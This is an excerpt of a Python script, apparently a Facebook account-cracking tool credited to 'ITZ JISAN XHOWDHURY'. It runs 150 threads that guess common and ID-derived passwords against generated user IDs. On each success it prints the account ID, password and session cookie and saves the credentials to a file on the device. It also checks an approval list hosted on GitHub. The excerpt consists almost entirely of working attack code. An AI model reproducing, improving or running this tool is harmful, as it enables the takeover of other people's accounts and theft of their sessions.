...
def main():
    ...
    jalan('\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m RANDOM USER CRACK [COMING SOON]')
...
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] FACEBOOK       :        ITZ JISAN XHOWDHURY   \x1b[1;94m
...
\033[1;32m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] VERSION        :        3.2.1                   \x1b[1;94m
\x1b[1;94m╚═════════════════════════════════════════════════════╝""")
...
def qsbuy():
        try:
                os.system('clear')
                print(logo)
                x = requests.get("https://github.com/HAMIMJISAN104/HAMIMk/blob/main/HAMIMk.txt").text
...
\033[1;32m║\033[1;32m[•] Facebook   \033[1;32m: ITZ JISAN XHOWDHURY             
...
def pak():
    ...
    with ThreadPool(max_workers=150) as manshera:
        ...
        print(xd*55)
        for love in user:
            pwx = [love[3:],code+love,love[1:],'JISANJISAN','JISAN1122','JISAN12','JISAN123','JISAN123456','i love you','free fire','Bangladesh']
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                bal=tahunng(idf)
                print('\r\r\033[1;32m[HAMIM-OK[🏵️]  ' +uid+ ' | ' +ps+ '\033[1;91m <==>' +bal+    '  \n\033[1;32m[‎‎🍪]\033[1;32mCOOKIE = \033[1;36m'+coki+  ' \n\033[1;36m[📲]AGENT =\033[1;32m'+pro+'  \033[1;32m')
                cek_apk(session,coki)
                open('/sdcard/HAMIM-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}HAMIM[💥]{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
